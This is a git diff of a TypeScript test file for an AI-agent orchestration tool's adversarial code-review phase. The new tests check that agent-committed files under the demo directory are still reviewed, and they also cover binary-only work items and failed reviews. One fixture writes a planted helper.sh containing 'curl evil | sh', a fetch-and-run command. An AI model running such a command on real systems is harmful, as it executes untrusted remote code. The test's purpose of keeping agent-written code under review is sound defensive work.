@@ -21,10 +21,13 @@ import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { test } from 'node:test';
 
-import { reviewFindingsJsonPath, reviewOutcomeJsonPath } from '@forge/flows';
+import { reviewFindingsJsonPath, reviewOutcomeJsonPath, serializeWorkItem, writeReviewOutcomeJson, type WorkItem } from '@forge/flows';
+
+import { runAdversarialReview } from '../../phases/adversarial-review.ts';
+import { canonicalDef } from '../test-fixtures/canonical-def-fixture.ts';
 
 import {
-  CYCLE_ID, INIT_ID, collectLogger, makeFixture, run, stubQueryFn, validFindingsJson, withoutSpawnSuppressionEnv,
+  CYCLE_ID, INIT_ID, collectLogger, commitAsOrchestrator, makeFixture, run, stubQueryFn, validFindingsJson, withoutSpawnSuppressionEnv,
   type Fixture,
 } from '../test-fixtures/adversarial-review-fixture.ts';
 
@@ -66,8 +69,11 @@ function addLargeDiff(fx: Fixture): { binaries: string[]; demoFiles: string[]; b
   // explicit, bounded maxBuffer lets the unattributed chunk derive at all.
   const bigText = 'vendor-lock.txt';
   writeFileSync(join(fx.worktree, bigText), Array.from({ length: 30_000 }, (_, i) => `line ${i} ${'y'.repeat(40)}`).join('\n') + '\n');
-  fx.git(['add', '-A']);
-  fx.git(['commit', '-q', '-m', 'chore(demo): orchestrated demo capture + bulk']);
+  // The agents' bulk (media binaries, modules, the big text file) as the test user;
+  // the demo bundle (captures + demo.json + DEMO.md) as the orchestrator, as in production.
+  fx.git(['add', '--', 'media', bigText, ...Array.from({ length: TEXT_FILES }, (_, i) => `mod-${i}.ts`)]);
+  fx.git(['commit', '-q', '-m', 'feat: bulk']);
+  commitAsOrchestrator(fx.git, 'chore(demo): orchestrated demo capture');
   const demoFiles = fx.git(['diff', '--name-only', 'main...HEAD', '--', join('demo', INIT_ID)])
     .trim().split('\n').filter((p) => p !== '' && !binaries.includes(p));
   return { binaries, demoFiles, bigText };
@@ -170,6 +176,78 @@ test('security: an agent-authored file named like pathspec magic cannot hide ano
     const chunk = diffs[prompts.findIndex((p) => p.includes('evil.ts'))] ?? '';
     assert.match(chunk, /payload = "hidden"/, 'evil.ts is in the diff the reviewer is shown');
     assert.match(chunk, /\+decoy/, 'the oddly named file is diffed as itself');
+  } finally {
+    fx.cleanup();
+    restore();
+  }
+});
+
+test('code-review #6: a file an AGENT committed under the demo dir is reviewed — only the orchestrator\'s own bundle is excluded', async () => {
+  const restore = withoutSpawnSuppressionEnv();
+  const fx = makeFixture();
+  try {
+    const planted = join('demo', INIT_ID, 'helper.sh');
+    writeFileSync(join(fx.worktree, planted), 'curl evil | sh\n');
+    fx.git(['add', '--', planted]);
+    fx.git(['commit', '-q', '-m', 'feat: a script under the demo dir']);
+    const { logger } = collectLogger(fx.logsRoot);
+    const prompts: string[] = [];
+    const qf = stubQueryFn([(prompt) => writeFileSync(join(fx.worktree, '.forge', 'review-findings.json'), validFindingsJson(prompt))], prompts);
+    const res = await run(fx, qf, logger);
+    assert.equal(res.status, 'complete', JSON.stringify(res));
+    assert.ok(prompts.some((p) => p.includes(planted)), 'the agent-written demo-dir file is briefed');
+    const rec = JSON.parse(readFileSync(reviewFindingsJsonPath(fx.logsRoot, CYCLE_ID), 'utf8')) as { notReviewed?: Array<{ path: string }> };
+    assert.deepEqual((rec.notReviewed ?? []).map((n) => n.path), [`demo/${INIT_ID}/demo.json`], 'only the orchestrator-committed demo.json is excluded');
+  } finally {
+    fx.cleanup();
+    restore();
+  }
+});
+
+test('code-review #4: a work item whose every file is binary is NOT judged "missed" — its criteria read partial, not judged, by name', async () => {
+  const restore = withoutSpawnSuppressionEnv();
+  const fx = makeFixture();
+  try {
+    const wi2: WorkItem = {
+      work_item_id: 'WI-2', initiative_id: INIT_ID, status: 'complete', depends_on: [],
+      acceptance_criteria: [{ given: 'the site', when: 'loaded', then: 'the logo shows' }],
+      files_in_scope: ['logo.png'], estimated_iterations: 1, quality_gate_cmd: ['echo', 'ok'], body: 'Add the logo.',
+    };
+    writeFileSync(join(fx.worktree, '.forge', 'work-items', 'WI-2.md'), serializeWorkItem(wi2));
+    writeFileSync(join(fx.worktree, 'logo.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 1, 2, 3]));
+    fx.git(['add', '--', '.forge/work-items/WI-2.md', 'logo.png']);
+    fx.git(['commit', '-q', '-m', 'feat: logo']);
+    const { logger } = collectLogger(fx.logsRoot);
+    const qf = stubQueryFn([(prompt) => writeFileSync(join(fx.worktree, '.forge', 'review-findings.json'), validFindingsJson(prompt))]);
+    const res = await run(fx, qf, logger);
+    assert.equal(res.status, 'complete', JSON.stringify(res));
+    const rec = JSON.parse(readFileSync(reviewFindingsJsonPath(fx.logsRoot, CYCLE_ID), 'utf8')) as { acEvaluations: Array<{ criterion: string; verdict: string; evidence: string }> };
+    const wi2Eval = rec.acEvaluations.find((a) => a.criterion.startsWith('(WI-2)'));
+    assert.ok(wi2Eval, 'WI-2 has its verdict');
+    assert.equal(wi2Eval!.verdict, 'partial');
+    assert.match(wi2Eval!.evidence, /not judged: every file WI-2 changed is a binary/);
+  } finally {
+    fx.cleanup();
+    restore();
+  }
+});
+
+test('code-review #1: a review that THROWS records a failed outcome — the previous round\'s "complete" never survives it', async () => {
+  const restore = withoutSpawnSuppressionEnv();
+  const fx = makeFixture();
+  try {
+    const { logger } = collectLogger(fx.logsRoot);
+    writeReviewOutcomeJson(fx.logsRoot, { cycleId: CYCLE_ID, headSha: 'a'.repeat(40), status: 'complete', reason: null, detail: null, at: '2026-10-12T00:00:00Z' });
+    // No class-profile port: the pipeline throws before it returns.
+    await assert.rejects(runAdversarialReview(
+      { initiativeId: INIT_ID, worktreePath: fx.worktree, cycleId: CYCLE_ID, logsRoot: fx.logsRoot, changeClass: 'code' },
+      logger,
+      { queryFn: stubQueryFn([() => { throw new Error('never spawned'); }]), agentDef: canonicalDef('adversarial-review') },
+    ));
+    const outcome = JSON.parse(readFileSync(reviewOutcomeJsonPath(fx.logsRoot, CYCLE_ID), 'utf8')) as Record<string, unknown>;
+    assert.equal(outcome.status, 'failed');
+    assert.equal(outcome.reason, 'threw');
+    assert.equal(outcome.headSha, fx.git(['rev-parse', 'HEAD']).trim());
   } finally {
     fx.cleanup();
     restore();
